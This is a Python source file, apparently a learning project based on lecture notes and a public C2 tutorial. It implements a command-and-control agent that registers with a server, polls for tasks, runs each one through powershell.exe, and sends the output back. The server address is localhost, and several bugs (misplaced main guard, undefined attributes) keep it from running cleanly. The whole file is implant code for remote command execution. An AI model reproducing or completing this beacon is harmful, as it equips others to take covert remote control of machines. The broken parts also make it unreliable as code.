#refrenced 0xRick c2 code, lecture notes and code
import time
import os, sys
import random, string
import requests 
import subprocess
import time
from flask import Flask, request


class agents():
    """被控端表"""
    __tablename__ = 'agents'
    server = "http://127.0.0.1:5000"
    task_path = "/tasks"
    response_path = "/response"
    register_path = "/register"

    
    def __init__(self, encryptionkey, timesleep=3):
       self.agent_id = os.urandom(10).hex()
       self.hostname = None
       self.username = None
       self.guid = "".join(random.choice(string.ascii_letters + string.digits) for i in range(8))
       self.integrity = None
       self.ip = "127.0.0.1"
       self.encryption_key = encryptionkey
       self.sleep_time = timesleep
       self.first_seen = None
       self.last_seen = None
       self.active = False
       self.task = None
       

    def CheckIn(self):
        self.last_seen = time.asctime(time.localtime(time.time()))
        #change last_seen in database
        
    
    def fetch_tasks(self):
        r = requests.get(f"{self.server}{self.task_path}")
        if r.status_code == 200:
            return r.text.split("\n")
        return []
    
    def run_tasks(self, cmds):
        self.output = ""
        print(cmds)
        cmds = [i for i in cmds if i]
        for cmd in cmds:
            print("CMD:",cmd)
            self.result = subprocess.Popen(f"powershell.exe /c {cmd}", stdout=subprocess.PIPE)
            self.output += self.result.stdout.read().decode() + "\n"
        return self.output 
    
    def register(self):
        self.active = True
        self.username = subprocess.Popen("username", stdout=subprocess.PIPE)
        self.hostname = subprocess.Popen("hostname", stdout=subprocess.PIPE)
        self.first_seen = time.asctime(time.localtime(time.time()))
        self.last_seen = self.first_seen
        self.whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
        self.output += self.result.stdout.read().decode()
        #add info to database
        r = requests.post(f"{self.server}{self.register_path}", json={"agent_id":self.agent_id, "whoami":self.whoami})
        if r.status_code ==200:
            if r.text == "OK":
                print("reigstered!")
                return True 
        return False 
    
    def send_response(self, results):
        r = requests.post(f"{self.server}{self.response_path}", data=results)
        if r.status_code ==200:
            if r.text == "OK":
                print("response returned!")
                return True 
        else:
            return False
        
    def main(self):
        while not self.register():
            time.sleep(self.sleep_time)
        while True:
            time.sleep(1 + random.randint(1,5))
            try:
                cmds = self.fetch_tasks()
            except Exception as e:
                print(Exception, e)
                continue
            if cmds:
                self.CheckIn()
                results = self.run_tasks(cmds)
                self.send_response(results)


    if __name__ == "__main__":
        main()
        

        
